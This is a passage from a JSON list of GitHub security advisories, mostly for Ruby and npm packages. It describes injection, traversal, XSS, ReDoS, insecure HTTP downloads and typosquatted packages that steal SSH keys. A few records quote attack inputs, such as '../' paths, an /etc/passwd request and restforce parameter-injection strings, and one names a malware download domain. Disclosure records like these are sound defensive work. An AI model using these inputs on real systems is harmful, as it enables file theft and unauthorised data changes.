    "description": "xpointer.c in libxml2 before 2.9.5 (as used in nokogiri before 1.7.1 amongst other products) does not forbid namespace nodes in XPointer ranges, which allows remote attackers to execute arbitrary code or cause a denial of service (use-after-free and memory corruption) via a crafted XML document.",
    "summary": "High severity vulnerability that affects nokogiri"
  },
  {
    "ghsaId": "GHSA-hm48-76wh-q86v",
    "publishedAt": "2018-08-21T19:03:17Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nactiverecord/lib/active_record/relation/query_methods.rb in Active Record in Ruby on Rails 4.0.x before 4.0.9 and 4.1.x before 4.1.5 allows remote attackers to bypass the strong parameters protection mechanism via crafted input to an application that makes create_with calls.",
    "summary": "High severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-xjqg-9jvg-fgx2",
    "publishedAt": "2018-08-21T19:03:04Z",
    "description": "The xmlStringLenDecodeEntities function in parser.c in libxml2 before 2.9.3 (as used in nokogiri before 1.6.7.1) does not properly prevent entity expansion, which allows context-dependent attackers to cause a denial of service (CPU consumption) via crafted XML data, a different vulnerability than CVE-2014-3660.",
    "summary": "High severity vulnerability that affects nokogiri"
  },
  {
    "ghsaId": "GHSA-w655-w578-99pq",
    "publishedAt": "2018-08-21T17:09:08Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe espeak-ruby gem before 1.0.3 for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in a string to the speak, save, bytes or bytes_wav method in lib/espeak/speech.rb.",
    "summary": "High severity vulnerability that affects espeak-ruby"
  },
  {
    "ghsaId": "GHSA-36p7-xjw8-h6f2",
    "publishedAt": "2018-08-21T17:08:30Z",
    "description": "Ruby-saml before 1.3.0 allows attackers to perform XML signature wrapping attacks via unspecified vectors.",
    "summary": "Moderate severity vulnerability that affects ruby-saml"
  },
  {
    "ghsaId": "GHSA-cqxw-3p7v-p9gr",
    "publishedAt": "2018-08-21T17:08:03Z",
    "description": "In Phusion Passenger before 5.1.0, a known /tmp filename was used during passenger-install-nginx-module execution, which could allow local attackers to gain the privileges of the passenger user.",
    "summary": "Moderate severity vulnerability that affects passenger"
  },
  {
    "ghsaId": "GHSA-cwp3-834g-x79g",
    "publishedAt": "2018-08-21T17:07:36Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nDirectory traversal vulnerability in the minitar before 0.6 and archive-tar-minitar 0.5.2 gems for Ruby allows remote attackers to write to arbitrary files via a .. (dot dot) in a TAR archive entry.",
    "summary": "Moderate severity vulnerability that affects archive-tar-minitar and minitar"
  },
  {
    "ghsaId": "GHSA-jhq3-57xh-6643",
    "publishedAt": "2018-08-21T17:03:59Z",
    "description": "A privilege escalation detected in flintcms versions <= 1.1.9 allows account takeover due to blind MongoDB injection in password reset.",
    "summary": "High severity vulnerability that affects flintcms"
  },
  {
    "ghsaId": "GHSA-h3c2-x77c-7pvr",
    "publishedAt": "2018-08-21T17:03:33Z",
    "description": "A command injection in git-dummy-commit v1.3.0 allows os level commands to be executed due to an unescaped parameter.",
    "summary": "High severity vulnerability that affects git-dummy-commit"
  },
  {
    "ghsaId": "GHSA-38f5-ghc2-fcmv",
    "publishedAt": "2018-08-21T17:02:43Z",
    "description": "A code injection in cryo 0.0.6 allows an attacker to arbitrarily execute code due to insecure implementation of deserialization.",
    "summary": "Critical severity vulnerability that affects cryo"
  },
  {
    "ghsaId": "GHSA-xrr4-74mc-rpjc",
    "publishedAt": "2018-08-21T17:01:29Z",
    "description": "pyro before 3.15 unsafely handles pid files in temporary directory locations and opening the pid file as root. An attacker can use this flaw to overwrite arbitrary files via symlinks.",
    "summary": "Moderate severity vulnerability that affects pyro"
  },
  {
    "ghsaId": "GHSA-2r9c-46v3-43fc",
    "publishedAt": "2018-08-17T20:28:13Z",
    "description": "Haxe 3 : The Cross-Platform Toolkit (a fork from David Mouton's damoebius/haxe-npm) haxe3 downloads resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects haxe3"
  },
  {
    "ghsaId": "GHSA-vcfp-ppqw-mf23",
    "publishedAt": "2018-08-17T20:20:46Z",
    "description": "fis-sass-all is another libsass wrapper for node. fis-sass-all downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects fis-sass-all"
  },
  {
    "ghsaId": "GHSA-mf6w-45cf-qhmp",
    "publishedAt": "2018-08-15T20:04:44Z",
    "description": "git-fastclone before 1.0.5 passes user modifiable strings directly to a shell command. An attacker can execute malicious commands by modifying the strings that are passed as arguments to \"cd \" and \"git clone \" commands in the library.",
    "summary": "High severity vulnerability that affects git-fastclone"
  },
  {
    "ghsaId": "GHSA-7322-9mx6-5j2m",
    "publishedAt": "2018-08-15T20:04:30Z",
    "description": "Stack-based buffer overflow in the header_anchor function in the HTML renderer in Redcarpet before 3.3.2 allows attackers to cause a denial of service (crash) and possibly execute arbitrary code via unspecified vectors.",
    "summary": "High severity vulnerability that affects redcarpet"
  },
  {
    "ghsaId": "GHSA-9wv8-jgw4-4g28",
    "publishedAt": "2018-08-15T20:04:13Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe festivaltts4r gem for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in a string to the (1) to_speech or (2) to_mp3 method in lib/festivaltts4r/festival4r.rb.",
    "summary": "High severity vulnerability that affects festivaltts4r"
  },
  {
    "ghsaId": "GHSA-9wcm-rrvh-qjc8",
    "publishedAt": "2018-08-15T20:03:53Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe initialize method in the Histogram class in lib/colorscore/histogram.rb in the colorscore gem before 0.0.5 for Ruby allows context-dependent attackers to execute arbitrary code via shell metacharacters in the (1) image_path, (2) colors, or (3) depth variable.",
    "summary": "High severity vulnerability that affects colorscore"
  },
  {
    "ghsaId": "GHSA-8gg6-3r63-25m8",
    "publishedAt": "2018-08-15T20:03:37Z",
    "description": "git-fastclone before 1.0.1 permits arbitrary shell command execution from .gitmodules. If an attacker can instruct a user to run a recursive clone from a repository they control, they can get a client to run an arbitrary shell command. Alternately, if an attacker can MITM an unencrypted git clone, they could exploit this. The ext command will be run if the repository is recursively cloned or if submodules are updated. This attack works when cloning both local and remote repositories.",
    "summary": "High severity vulnerability that affects git-fastclone"
  },
  {
    "ghsaId": "GHSA-4cmx-hrq9-c23p",
    "publishedAt": "2018-08-15T20:03:22Z",
    "description": "Improper authorization in aedes version < 0.35.1 will publish a LWT in a channel when a client is not authorized.",
    "summary": "Moderate severity vulnerability that affects aedes"
  },
  {
    "ghsaId": "GHSA-hg4c-rgvm-964g",
    "publishedAt": "2018-08-15T20:02:53Z",
    "description": "A SQL injection vulnerability in pycsw all versions before 2.0.2, 1.10.5 and 1.8.6 that leads to read and extract of any data from any table in the pycsw database that the database user has access to. Also on PostgreSQL (at least) it is possible to perform updates/inserts/deletes and database modifications to any table the database user has access to.",
    "summary": "High severity vulnerability that affects pycsw"
  },
  {
    "ghsaId": "GHSA-4j59-hfw6-6w7h",
    "publishedAt": "2018-08-15T19:30:48Z",
    "description": "cmake installs the cmake x86 linux binaries. cmake downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects cmake"
  },
  {
    "ghsaId": "GHSA-ph8p-2g97-9654",
    "publishedAt": "2018-08-15T19:27:25Z",
    "description": "jstestdriver is a wrapper for Google's jstestdriver. jstestdriver downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects jstestdriver"
  },
  {
    "ghsaId": "GHSA-5rc6-2r3r-fv79",
    "publishedAt": "2018-08-15T19:25:47Z",
    "description": "slimerjs-edge is a npm wrapper for installing the bleeding edge version of slimerjs. slimerjs-edge downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Moderate severity vulnerability that affects slimerjs-edge"
  },
  {
    "ghsaId": "GHSA-x7q3-67vc-wvcf",
    "publishedAt": "2018-08-15T19:05:14Z",
    "description": "grunt-images is a grunt plugin for processing images. grunt-images downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects grunt-images"
  },
  {
    "ghsaId": "GHSA-p65h-233c-jxvm",
    "publishedAt": "2018-08-15T19:03:59Z",
    "description": "resourcehacker is a Node wrapper of Resource Hacker (windows executable resource editor). resourcehacker downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects resourcehacker"
  },
  {
    "ghsaId": "GHSA-8wg9-92fr-6j7v",
    "publishedAt": "2018-08-15T18:50:31Z",
    "description": "marionette-socket-host is a marionette-js-runner host for sending actions over a socket. marionette-socket-host downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects marionette-socket-host"
  },
  {
    "ghsaId": "GHSA-2m39-62fm-q8r3",
    "publishedAt": "2018-08-15T13:22:23Z",
    "description": "The sshpk NPM package is vulnerable to ReDoS when parsing crafted invalid public keys.",
    "summary": "Moderate severity vulnerability that affects sshpk"
  },
  {
    "ghsaId": "GHSA-5p9f-55j8-922m",
    "publishedAt": "2018-08-13T20:49:10Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe Doorkeeper gem before 4.2.0 for Ruby might allow remote attackers to conduct replay attacks or revoke arbitrary tokens by leveraging failure to implement the OAuth 2.0 Token Revocation specification.",
    "summary": "Moderate severity vulnerability that affects doorkeeper"
  },
  {
    "ghsaId": "GHSA-m8h6-m9p5-p2f8",
    "publishedAt": "2018-08-13T20:49:01Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nActive Record in Ruby on Rails 4.2.x before 4.2.7.1 does not properly consider differences in parameter handling between the Active Record component and the JSON implementation, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks or trigger missing WHERE clauses via a crafted request, as demonstrated by certain \"[nil]\" values, a related issue to CVE-2012-2660, CVE-2012-2694, and CVE-2013-0155.",
    "summary": "Moderate severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-2pwf-xwr3-hp55",
    "publishedAt": "2018-08-13T20:48:52Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nDirectory traversal vulnerability in Action View in Ruby on Rails before 3.2.22.2 and 4.x before 4.1.14.2 allows remote attackers to read arbitrary files by leveraging an application's unrestricted use of the render method and providing a .. (dot dot) in a pathname.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-0752.",
    "summary": "Moderate severity vulnerability that affects actionview"
  },
  {
    "ghsaId": "GHSA-hx46-vwmx-wx95",
    "publishedAt": "2018-08-13T20:48:25Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nAction Pack in Ruby on Rails before 3.2.22.2, 4.x before 4.1.14.2, and 4.2.x before 4.2.5.2 allows remote attackers to execute arbitrary Ruby code by leveraging an application's unrestricted use of the render method.",
    "summary": "High severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-82x2-g7vr-39wq",
    "publishedAt": "2018-08-13T20:48:09Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nrequest.rb in Web Console before 2.1.3, as used with Ruby on Rails 3.x and 4.x, does not properly restrict the use of X-Forwarded-For headers in determining a client's IP address, which allows remote attackers to bypass the whitelisted_ips protection mechanism via a crafted request.",
    "summary": "Moderate severity vulnerability that affects web-console"
  },
  {
    "ghsaId": "GHSA-phmw-pv3f-vvx7",
    "publishedAt": "2018-08-13T20:47:44Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe thoughtbot paperclip gem before 4.2.2 for Ruby does not consider the content-type value during media-type validation, which allows remote attackers to upload HTML documents and conduct cross-site scripting (XSS) attacks via a spoofed value, as demonstrated by image/jpeg.",
    "summary": "Moderate severity vulnerability that affects paperclip"
  },
  {
    "ghsaId": "GHSA-3fhf-6939-qg8p",
    "publishedAt": "2018-08-13T20:47:22Z",
    "description": "REST client for Ruby (aka rest-client) before 1.8.0 allows remote attackers to conduct session fixation attacks or obtain sensitive cookie information by leveraging passage of cookies set in a response to a redirect.",
    "summary": "High severity vulnerability that affects rest-client"
  },
  {
    "ghsaId": "GHSA-995j-587r-259w",
    "publishedAt": "2018-08-13T20:46:58Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe rack-mini-profiler gem before 0.10.1 for Ruby allows remote attackers to obtain sensitive information about allocated strings and objects by leveraging incorrect ordering of security checks.",
    "summary": "Moderate severity vulnerability that affects rack-mini-profiler"
  },
  {
    "ghsaId": "GHSA-694m-jhr9-pf77",
    "publishedAt": "2018-08-13T20:46:41Z",
    "description": "Doorkeeper version 4.2.0 and later contains a Incorrect Access Control vulnerability in Token revocation API's authorized method that can result in Access tokens are not revoked for public OAuth apps, leaking access until expiry.",
    "summary": "High severity vulnerability that affects doorkeeper"
  },
  {
    "ghsaId": "GHSA-f599-5m7p-hcpf",
    "publishedAt": "2018-08-13T20:45:32Z",
    "description": "The grape rubygem suffers from a cross-site scripting (XSS) vulnerability via \"format\" parameter.",
    "summary": "Moderate severity vulnerability that affects grape"
  },
  {
    "ghsaId": "GHSA-2j55-pcw5-x4h2",
    "publishedAt": "2018-08-13T15:02:49Z",
    "description": "The `active-support` ruby gem gem is malware and duplicates the official `activesupport` (no hyphen) gem, but adds a compiled extension. The extension attempts to resolve a base64 encoded domain (29faea63.planfhntage.de), downloads a payload, and executes.\r\n \r\nThis trojan horse gem could allow a remote attacker to execute arbitrary code on the system, caused by containing a malicious backdoor. An attacker could exploit this vulnerability to execute arbitrary code on the system.  No version of this gem should be considered safe.",
    "summary": "Critical severity vulnerability that affects active-support"
  },
  {
    "ghsaId": "GHSA-pv4c-p2j5-38j4",
    "publishedAt": "2018-08-13T15:02:15Z",
    "description": "Incorrect parsing in url-parse <1.4.3 returns wrong hostname which leads to multiple vulnerabilities such as SSRF, Open Redirect, Bypass Authentication Protocol.",
    "summary": "High severity vulnerability that affects url-parse"
  },
  {
    "ghsaId": "GHSA-9cp3-fh5x-xfcj",
    "publishedAt": "2018-08-09T20:55:46Z",
    "description": "charset 1.0.0 and below are vulnerable to regular expression denial of service. Input of around 50k characters is required for a slow down of around 2 seconds. Unless node was compiled using the -DHTTP_MAX_HEADER_SIZE= option the default header max length is 80kb, so the impact of the ReDoS is relatively low.",
    "summary": "Moderate severity vulnerability that affects charset"
  },
  {
    "ghsaId": "GHSA-gxpj-cx7g-858c",
    "publishedAt": "2018-08-09T20:18:07Z",
    "description": "The debug module is vulnerable to regular expression denial of service when untrusted user input is passed into the o formatter. It takes around 50k characters to block for 2 seconds making this a low severity issue.",
    "summary": "Low severity vulnerability that affects debug"
  },
  {
    "ghsaId": "GHSA-8225-6cvr-8pqp",
    "publishedAt": "2018-08-09T20:13:01Z",
    "description": "The HTTP client module superagent is vulnerable to ZIP bomb attacks. In a ZIP bomb attack, the HTTP server replies with a compressed response that becomes several magnitudes larger once uncompressed. If a client does not take special care when processing such responses, it may result in excessive CPU and/or memory consumption. An attacker might exploit such a weakness for a DoS attack. To exploit this the attacker must control the location (URL) that superagent makes a request to.",
    "summary": "Low severity vulnerability that affects superagent"
  },
  {
    "ghsaId": "GHSA-q7wx-62r7-j2x7",
    "publishedAt": "2018-08-08T22:31:12Z",
    "description": "The xmlreader in libxml allows remote attackers to cause a denial of service (memory consumption) via crafted XML data, related to an XML Entity Expansion (XEE) attack.",
    "summary": "Moderate severity vulnerability that affects nokogiri"
  },
  {
    "ghsaId": "GHSA-pxqr-8v54-m2hj",
    "publishedAt": "2018-08-08T22:30:35Z",
    "description": "rails_admin ruby gem <v1.1.1 is vulnerable to cross-site request forgery (CSRF) attacks. Non-GET methods were not validating CSRF tokens and, as a result, an attacker could hypothetically gain access to the application administrative endpoints exposed by the gem.",
    "summary": "Moderate severity vulnerability that affects rails_admin"
  },
  {
    "ghsaId": "GHSA-44vc-fpcg-5cc5",
    "publishedAt": "2018-08-08T22:29:49Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe Safemode gem before 1.2.4 for Ruby, when initialized with a delegate object that is a Rails controller, allows context-dependent attackers to obtain sensitive information via the inspect method.",
    "summary": "Moderate severity vulnerability that affects safemode"
  },
  {
    "ghsaId": "GHSA-8474-rc7c-wrhp",
    "publishedAt": "2018-08-08T22:29:10Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe safemode rubygem, as used in Foreman, versions 1.3.2 and earlier are vulnerable to bypassing safe mode limitations via special Ruby syntax. This can lead to deletion of objects for which the user does not have delete permissions or possibly to privilege escalation.",
    "summary": "High severity vulnerability that affects safemode"
  },
  {
    "ghsaId": "GHSA-8f64-q7jc-ccgp",
    "publishedAt": "2018-08-08T22:25:57Z",
    "description": "There is a stored Cross-Site Scripting vulnerability in Open Graph meta properties read by the `metascraper` npm module <= 3.11.8.",
    "summary": "Moderate severity vulnerability that affects metascraper"
  },
  {
    "ghsaId": "GHSA-fv9m-f7w4-889c",
    "publishedAt": "2018-08-06T21:43:03Z",
    "description": "discordi.js is a malicious module based on the discord.js library that exfiltrates login tokens to pastebin.",
    "summary": "Moderate severity vulnerability that affects discordi.js"
  },
  {
    "ghsaId": "GHSA-6fjr-m7v6-fpg9",
    "publishedAt": "2018-08-06T21:41:38Z",
    "description": "The jquey module exfiltrates sensitive data such as a user's private SSH key and bash history to a third party server during installation.",
    "summary": "Moderate severity vulnerability that affects jquey"
  },
  {
    "ghsaId": "GHSA-f499-jv47-9wxf",
    "publishedAt": "2018-08-06T21:40:02Z",
    "description": "desafio is a simple web server. desafio is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url, but is limited to accessing only .html files.",
    "summary": "Moderate severity vulnerability that affects desafio"
  },
  {
    "ghsaId": "GHSA-cpp2-q66x-fq44",
    "publishedAt": "2018-08-06T21:39:12Z",
    "description": "jikes is a file server. jikes is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url. Accessible files are restricted to files with .htm and .js extensions.",
    "summary": "Moderate severity vulnerability that affects jikes"
  },
  {
    "ghsaId": "GHSA-5mjw-6jrh-hvfq",
    "publishedAt": "2018-08-06T21:37:06Z",
    "description": "The static-eval module is intended to evaluate statically-analyzable expressions. In affected versions, untrusted user input is able to access the global function constructor, effectively allowing arbitrary code execution.",
    "summary": "Moderate severity vulnerability that affects static-eval"
  },
  {
    "ghsaId": "GHSA-72fg-jqhx-c68p",
    "publishedAt": "2018-08-06T21:33:31Z",
    "description": "st is a module for serving static files. An attacker is able to craft a request that results in an HTTP 301 (redirect) to an entirely different domain. A request for: http://some.server.com//nodesecurity.org/%2e%2e would result in a 301 to //nodesecurity.org/%2e%2e which most browsers treat as a proper redirect as // is translated into the current schema being used. Mitigating factor: In order for this to work, st must be serving from the root of a server (/) rather than the typical sub directory (/static/) and the redirect URL will end with some form of URL encoded .. (\"%2e%2e\", \"%2e.\", \".%2e\").",
    "summary": "Moderate severity vulnerability that affects st"
  },
  {
    "ghsaId": "GHSA-rp28-29ch-gh92",
    "publishedAt": "2018-08-06T21:30:15Z",
    "description": "elding is a simple web server. elding is vulnerable to a directory traversal issue, allowing an attacker to access the filesystem by placing \"../\" in the url. The files accessible, however, are limited to files with a file extension. Sending a GET request to /../../../etc/passwd, for example, will return a 404 on etc/passwd/index.js.",
    "summary": "Moderate severity vulnerability that affects elding"
  },
  {
    "ghsaId": "GHSA-mc9x-v9xg-25pm",
    "publishedAt": "2018-08-06T20:12:54Z",
    "description": "The coffescript module exfiltrates sensitive data such as a user's private SSH key and bash history to a third party server during installation.",
    "summary": "Moderate severity vulnerability that affects coffescript"
  },
  {
    "ghsaId": "GHSA-c9rj-pgxv-84jc",
    "publishedAt": "2018-08-06T20:12:46Z",
    "description": "The cofee-script module exfiltrates sensitive data such as a user's private SSH key and bash history to a third party server during installation.",
    "summary": "Moderate severity vulnerability that affects cofee-script"
  },
  {
    "ghsaId": "GHSA-j49g-mp79-5vm5",
    "publishedAt": "2018-08-06T20:06:29Z",
    "description": "The coffe-script module exfiltrates sensitive data such as a user's private SSH key and bash history to a third party server during installation.",
    "summary": "Moderate severity vulnerability that affects coffe-script"
  },
  {
    "ghsaId": "GHSA-m6wh-m8m8-6xx5",
    "publishedAt": "2018-08-06T20:05:28Z",
    "description": "The cofeescript module exfiltrates sensitive data such as a user's private SSH key and bash history to a third party server during installation.",
    "summary": "Moderate severity vulnerability that affects cofeescript"
  },
  {
    "ghsaId": "GHSA-gf7h-vg5v-cch6",
    "publishedAt": "2018-08-06T20:03:21Z",
    "description": "ritp is a static web server. ritp is vulnerable to a directory traversal issue whereby an attacker can gain access to the file system by placing ../ in the URL. Access is restricted to files with a file extension, so files such as /etc/passwd are not accessible.",
    "summary": "Moderate severity vulnerability that affects ritp"
  },
  {
    "ghsaId": "GHSA-534w-937m-v7x3",
    "publishedAt": "2018-08-03T21:04:02Z",
    "description": "A flaw in how restforce constructs URLs may allow an attacker to inject additional parameters into Salesforce API requests.   \r\n\r\nImpact\r\n------\r\nThis flaw is only exploitable in applications that pass user input directly to restforce's select, find, describe, update, upsert, and destroy methods.\r\n\r\nVulnerable code might look like:\r\n```ruby\r\n  client.select('SomeSalesForceObject', params[:some-id],\r\n     ...)\r\n```\r\n\r\nIn such an application, attackers could pass `0016000000MRatd/describe`  as a request parameter, causing the server to make a request to a different endpoint than the server is designed to handle. Since the Salesforce REST API supports overriding HTTP methods via a request parameter, an attacker could also cause the client's `select()` method to modify data, by passing `0016000000MRatd/?_HttpMethod=PATCH&other-query-params=...`.\r\n\r\nWorkarounds\r\n------\r\nIf possible, applications should track salesforce IDs internally, rather than passing user-supplied IDs to salesforce. Such practice mitigates this vulnerability, and in general is desirable for ensuring strong access control.",
    "summary": "High severity vulnerability that affects restforce"
  },
  {
    "ghsaId": "GHSA-hxf5-mg84-pj4m",
    "publishedAt": "2018-07-31T23:03:17Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe duration function in the moment package before 2.11.2 for Node.js allows remote attackers to cause a denial of service (CPU consumption) via a long string, aka a \"regular expression Denial of Service (ReDoS).\"",
    "summary": "Moderate severity vulnerability that affects moment"
  },
  {
    "ghsaId": "GHSA-m5h6-hr3q-22h5",
    "publishedAt": "2018-07-31T22:58:35Z",
    "description": "The CLI in npm before 2.15.1 and 3.x before 3.8.3, as used in Node.js 0.10 before 0.10.44, 0.12 before 0.12.13, 4 before 4.4.2, and 5 before 5.10.0, includes bearer tokens with arbitrary requests, which allows remote HTTP servers to obtain sensitive information by reading Authorization headers.",
    "summary": "Moderate severity vulnerability that affects npm"
  },
  {
    "ghsaId": "GHSA-ccq6-3qx5-vmqx",
    "publishedAt": "2018-07-31T22:54:14Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe is-my-json-valid package before 2.12.4 for Node.js has an incorrect exports['utc-millisec'] regular expression, which allows remote attackers to cause a denial of service (blocked event loop) via a crafted string.",
    "summary": "Moderate severity vulnerability that affects is-my-json-valid"
  },
  {
    "ghsaId": "GHSA-jcpv-g9rr-qxrc",
    "publishedAt": "2018-07-31T22:52:00Z",
    "description": "Hawk before 3.1.3 and 4.x before 4.1.1 allow remote attackers to cause a denial of service (CPU consumption or partial outage) via a long (1) header or (2) URI that is matched against an improper regular expression.",
    "summary": "Moderate severity vulnerability that affects hawk"
  },
  {
    "ghsaId": "GHSA-8hj4-w233-g35q",
    "publishedAt": "2018-07-31T22:47:16Z",
    "description": "react-native-baidu-voice-synthesizer is a baidu voice speech synthesizer for react native. react-native-baidu-voice-synthesizer downloads resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects react-native-baidu-voice-synthesizer"
  },
  {
    "ghsaId": "GHSA-2p69-gxpm-5469",
    "publishedAt": "2018-07-31T22:34:45Z",
    "description": "alto-saxophone is a module to install and launch Chromedriver for Mac, Linux or Windows. alto-saxophone versions below 2.25.1 download binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects alto-saxophone"
  },
  {
    "ghsaId": "GHSA-cr6c-85fh-cqpg",
    "publishedAt": "2018-07-31T22:27:04Z",
    "description": "The haxeshim NPM package downloads resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects haxeshim"
  },
  {
    "ghsaId": "GHSA-m79w-4mqv-r39f",
    "publishedAt": "2018-07-31T22:06:33Z",
    "description": "windows-seleniumjar is a module that downloads the Selenium Jar file windows-seleniumjar downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects windows-seleniumjar"
  },
  {
    "ghsaId": "GHSA-wjr4-2jgw-hmv8",
    "publishedAt": "2018-07-31T18:28:53Z",
    "description": "Concatenating unsanitized user input in the `whereis` npm module < 0.4.1 allowed an attacker to execute arbitrary commands. The `whereis` module is deprecated and it is recommended to use the `which` npm module instead.",
    "summary": "High severity vulnerability that affects whereis"
  },
  {
    "ghsaId": "GHSA-fcf9-3qw3-gxmj",
    "publishedAt": "2018-07-31T18:28:09Z",
    "description": "A flaw was found in python-cryptography versions between >=1.9.0 and <2.3. The finalize_with_tag API did not enforce a minimum tag length. If a user did not validate the input length prior to passing it to finalize_with_tag an attacker could craft an invalid payload with a shortened tag (e.g. 1 byte) such that they would have a 1 in 256 chance of passing the MAC check. GCM tag forgeries can cause key leakage.",
    "summary": "High severity vulnerability that affects cryptography"
  },
  {
    "ghsaId": "GHSA-3q5q-f79q-7hr2",
    "publishedAt": "2018-07-31T18:21:46Z",
    "description": "Withdrawn, accidental duplicate publish.\r\n\r\nThe Zip::File component in the rubyzip gem before 1.2.1 for Ruby has a directory traversal vulnerability. If a site allows uploading of .zip files, an attacker can upload a malicious file that uses \"../\" pathname substrings to write arbitrary files to the filesystem.",
    "summary": "High severity vulnerability that affects rubyzip"
  },
  {
    "ghsaId": "GHSA-pf6m-fxpq-fg8v",
    "publishedAt": "2018-07-31T18:21:29Z",
    "description": "The xsltAddTextString function in transform.c in libxslt 1.1.29, as used in Nokogiri prior to 1.7.2, lacked a check for integer overflow during a size calculation, which allowed a remote attacker to perform an out of bounds memory write via a crafted HTML page.",
    "summary": "Low severity vulnerability that affects nokogiri"
  },
  {
    "ghsaId": "GHSA-2j9c-9vmv-7m39",
    "publishedAt": "2018-07-31T18:18:39Z",
    "description": "Missing anchor in generated regex for rack-cors before 0.4.1 allows a malicious third-party site to perform CORS requests. If the configuration were intended to allow only the trusted example.com domain name and not the malicious example.net domain name, then example.com.example.net (as well as example.com-example.net) would be inadvertently allowed.",
    "summary": "Moderate severity vulnerability that affects rack-cors"
  },
  {
    "ghsaId": "GHSA-6m53-c78q-7qmg",
    "publishedAt": "2018-07-31T18:18:19Z",
    "description": "mitmweb in mitmproxy before v4.0.4 allows DNS Rebinding attacks, related to tools/web/app.py.",
    "summary": "Moderate severity vulnerability that affects mitmproxy"
  },
  {
    "ghsaId": "GHSA-mj4x-wcxf-hm8x",
    "publishedAt": "2018-07-31T18:13:51Z",
    "description": "The json-jwt rubygem version >= 0.5.0 && < 1.9.4 contains a CWE-347: Improper Verification of Cryptographic Signature vulnerability in Decryption of AES-GCM encrypted JSON Web Tokens that can result in Attacker can forge a authentication tag. This attack appear to be exploitable via network connectivity. This vulnerability appears to have been fixed in 1.9.4 and later.",
    "summary": "High severity vulnerability that affects json-jwt"
  },
  {
    "ghsaId": "GHSA-2xvj-j3qh-x8c3",
    "publishedAt": "2018-07-31T18:13:05Z",
    "description": "private_address_check ruby gem before 0.5.0 is vulnerable to a time-of-check time-of-use (TOCTOU) race condition due to the address the socket uses not being checked. DNS entries with a TTL of 0 can trigger this case where the initial resolution is a public address but the subsequent resolution is a private address.",
    "summary": "High severity vulnerability that affects private_address_check"
  },
  {
    "ghsaId": "GHSA-gp82-xr77-88f4",
    "publishedAt": "2018-07-27T17:08:29Z",
    "description": "There are multiple Persistent XSS vulnerabilities in Radiant CMS 1.1.4. They affect Personal Preferences (Name and Username) and Configuration (Site Title, Dev Site Domain, Page Parts, and Page Fields).",
    "summary": "Moderate severity vulnerability that affects radiant"
  },
  {
    "ghsaId": "GHSA-q2qh-cgc2-qhr3",
    "publishedAt": "2018-07-27T17:07:50Z",
